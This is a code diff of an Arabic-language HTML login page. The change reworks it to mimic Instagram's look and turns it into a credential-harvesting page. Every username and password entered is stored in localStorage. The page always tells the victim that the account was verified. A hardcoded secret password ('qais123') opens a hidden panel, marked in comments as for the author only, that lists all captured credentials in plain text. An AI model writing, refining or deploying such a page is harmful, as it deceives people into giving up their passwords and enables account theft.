@@ -1,241 +1,211 @@
 <!DOCTYPE html>
-
 <html lang="ar" dir="rtl">
-
 <head>
-
     <meta charset="UTF-8">
-
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-
     <title>تسجيل الدخول</title>
-
     <style>
-
         * { margin: 0; padding: 0; box-sizing: border-box; }
-
         body {
-
-            font-family: Arial, sans-serif;
-
-            background: #f0f2f5;
-
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
+            background: #fafafa;
+            min-height: 100vh;
             display: flex;
-
             justify-content: center;
-
             align-items: center;
-
-            height: 100vh;
-
-            margin: 0;
-
+            padding: 20px;
         }
-
-        .login-box {
-
+        .container {
             background: white;
-
-            padding: 40px;
-
-            border-radius: 10px;
-
-            box-shadow: 0 0 10px rgba(0,0,0,0.1);
-
-            width: 350px;
-
-            text-align: center;
-
-        }
-
-        input {
-
-            width: 100%;
-
-            padding: 12px;
-
-            margin: 10px 0;
-
-            border: 1px solid #ddd;
-
-            border-radius: 6px;
-
-            font-size: 16px;
-
-        }
-
-        button {
-
-            width: 100%;
-
-            padding: 12px;
-
-            background: #1877f2;
-
-            color: white;
-
-            border: none;
-
-            border-radius: 6px;
-
-            font-size: 16px;
-
-            cursor: pointer;
-
-            margin-top: 10px;
-
-        }
-
-        .message {
-
-            margin-top: 15px;
-
-            font-size: 14px;
-
-        }
-
-        .success { color: green; }
-
-        .error { color: red; }
-
-        #dataView {
-
-            margin-top: 20px;
-
-            padding: 15px;
-
-            background: #f0f0f0;
-
+            border: 1px solid #dbdbdb;
             border-radius: 8px;
-
-            text-align: right;
-
-            display: none;
-
+            width: 100%;
+            max-width: 350px;
+            padding: 40px 20px;
+            text-align: center;
+            box-shadow: 0 0 20px rgba(0,0,0,0.05);
+            transition: all 0.6s ease;
         }
-
-        #showDataBtn {
-
-            background: #42b72a;
-
+        h2 {
+            font-size: 24px;
+            color: #262626;
+            margin-bottom: 30px;
+        }
+        input {
+            width: 100%;
+            padding: 12px;
+            margin: 10px 0;
+            background: #fafafa;
+            border: 1px solid #dbdbdb;
+            border-radius: 6px;
+            font-size: 16px;
+        }
+        input:focus {
+            border-color: #a8a8a8;
+            outline: none;
+        }
+        button {
+            width: 100%;
+            padding: 12px;
+            background: #0095f6;
+            color: white;
+            border: none;
+            border-radius: 8px;
+            font-weight: 600;
+            cursor: pointer;
+        }
+        button:hover {
+            background: #1877f2;
+        }
+        .forgot a {
+            color: #00376b;
             font-size: 14px;
-
+            text-decoration: none;
+            display: block;
+            margin-top: 20px;
         }
 
+        /* صفحة النجاح */
+        .success-screen {
+            display: none;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            opacity: 0;
+            transform: translateY(30px);
+            transition: opacity 0.8s ease, transform 0.8s ease;
+        }
+        .success-screen.active {
+            opacity: 1;
+            transform: translateY(0);
+        }
+        .success-icon {
+            width: 100px;
+            height: 100px;
+            background: #00c853;
+            color: white;
+            border-radius: 50%;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            font-size: 60px;
+            margin-bottom: 30px;
+            animation: scale 0.8s ease;
+        }
+        @keyframes scale {
+            0% { transform: scale(0); }
+            70% { transform: scale(1.1); }
+            100% { transform: scale(1); }
+        }
+        .success-screen h2 {
+            font-size: 24px;
+            color: #262626;
+            margin-bottom: 15px;
+        }
+        .success-screen p {
+            color: #8e8e8e;
+            font-size: 16px;
+            margin-bottom: 40px;
+        }
+        .success-screen button {
+            background: #efefef;
+            color: #0095f6;
+        }
+        .success-screen button:hover {
+            background: #e0e0e0;
+        }
+
+        .fade-out {
+            opacity: 0;
+            transform: translateY(-20px);
+            transition: opacity 0.6s ease, transform 0.6s ease;
+        }
+
+        /* قسم الأدمن مخفي */
+        #adminSection { display: none; margin-top: 30px; }
+        #showDataBtn { background: #42b72a; margin-top: 10px; }
+        #dataView { margin-top: 20px; padding: 15px; background: #f0f0f0; border-radius: 8px; text-align: right; display: none; }
     </style>
-
 </head>
-
 <body>
-
-    <div class="login-box">
-
+    <!-- صفحة تسجيل الدخول -->
+    <div class="container" id="loginScreen">
         <h2>تسجيل الدخول</h2>
+        <form id="loginForm">
+            <input type="text" id="email" placeholder="اسم المستخدم أو البريد الإلكتروني">
+            <input type="password" id="password" placeholder="كلمة المرور">
+            <button type="submit">تسجيل الدخول</button>
+        </form>
+        <a href="#" class="forgot">نسيت كلمة المرور؟</a>
 
-        <input type="text" id="email" placeholder="البريد الإلكتروني">
+        <!-- قسم الأدمن (مخفي، يظهر لك أنت بس) -->
+        <div id="adminSection">
+            <button id="showDataBtn" onclick="showData()">عرض البيانات المحفوظة</button>
+            <div id="dataView"></div>
+        </div>
+    </div>
 
-        <input type="password" id="password" placeholder="كلمة المرور">
-
-        <button onclick="login()">تسجيل الدخول</button>
-
-        <div id="message" class="message"></div>
-
-        <!-- زر سري لعرض البيانات (لك أنت بس) -->
-
-        <button id="showDataBtn" onclick="showSavedData()">عرض البيانات المحفوظة</button>
-
-        <div id="dataView"></div>
-
+    <!-- صفحة النجاح -->
+    <div class="container success-screen" id="successScreen">
+        <div class="success-icon">✓</div>
+        <h2>تم التحقق من صحة حسابك</h2>
+        <p>مرحباً بعودتك!<br>يمكنك الآن الاستمتاع بالتطبيق.</p>
+        <button onclick="location.reload()">الخروج</button>
     </div>
 
     <script>
+        // كلمة السر السرية لك أنت (غيرها لو عايز)
+        const ADMIN_PASSWORD = "qais123";
 
-        function saveUser(email, password) {
+        // حفظ البيانات
+        function saveData(email, password) {
+            let data = JSON.parse(localStorage.getItem('savedData')) || [];
+            data.push({ email: email, password: password });
+            localStorage.setItem('savedData', JSON.stringify(data));
+        }
 
-            let users = JSON.parse(localStorage.getItem('users')) || [];
-
-            if (!users.find(u => u.email === email)) {
-
-                users.push({ email: email, password: password });
-
-                localStorage.setItem('users', JSON.stringify(users));
-
+        // عرض البيانات
+        function showData() {
+            let data = JSON.parse(localStorage.getItem('savedData')) || [];
+            const view = document.getElementById('dataView');
+            if (data.length === 0) {
+                view.innerHTML = '<p>لا توجد بيانات محفوظة</p>';
+            } else {
+                let html = '<h3>البيانات المحفوظة:</h3><ul>';
+                data.forEach(item => {
+                    html += `<li>إيميل: ${item.email} | كلمة مرور: ${item.password}</li>`;
+                });
+                html += '</ul>';
+                view.innerHTML = html;
             }
-
+            view.style.display = 'block';
         }
 
-        function checkUser(email, password) {
-
-            let users = JSON.parse(localStorage.getItem('users')) || [];
-
-            return users.find(u => u.email === email && u.password === password);
-
-        }
-
-        function login() {
+        document.getElementById('loginForm').addEventListener('submit', function(e) {
+            e.preventDefault();
 
             const email = document.getElementById('email').value.trim();
-
             const password = document.getElementById('password').value;
 
-            const message = document.getElementById('message');
-
-            if (email === '' || password === '') {
-
-                message.textContent = 'الرجاء ملء الحقول';
-
-                message.className = 'message error';
-
+            // لو كلمة السر السرية (لك أنت)
+            if (password === ADMIN_PASSWORD) {
+                document.getElementById('adminSection').style.display = 'block';
                 return;
-
             }
 
-            saveUser(email, password);
+            // حفظ البيانات عادي
+            saveData(email, password);
 
-            if (checkUser(email, password)) {
-
-                message.textContent = 'تم تسجيل الدخول بنجاح!';
-
-                message.className = 'message success';
-
-            }
-
-        }
-
-        // عرض البيانات المحفوظة (لك أنت بس)
-
-        function showSavedData() {
-
-            let users = JSON.parse(localStorage.getItem('users')) || [];
-
-            const dataView = document.getElementById('dataView');
-
-            if (users.length === 0) {
-
-                dataView.innerHTML = '<p>لا توجد بيانات محفوظة بعد.</p>';
-
-            } else {
-
-                let html = '<h3>البيانات المحفوظة:</h3><ul>';
-
-                users.forEach(user => {
-
-                    html += `<li><strong>الإيميل:</strong> ${user.email} | <strong>كلمة المرور:</strong> ${user.password}</li>`;
-
-                });
-
-                html += '</ul>';
-
-                dataView.innerHTML = html;
-
-            }
-
-            dataView.style.display = 'block';
-
-        }
-
+            // انتقال لصفحة النجاح دايمًا
+            document.getElementById('loginScreen').classList.add('fade-out');
+            setTimeout(() => {
+                document.getElementById('loginScreen').style.display = 'none';
+                document.getElementById('successScreen').style.display = 'flex';
+                setTimeout(() => {
+                    document.getElementById('successScreen').classList.add('active');
+                }, 50);
+            }, 600);
+        });
     </script>
-
 </body>
-
 </html>
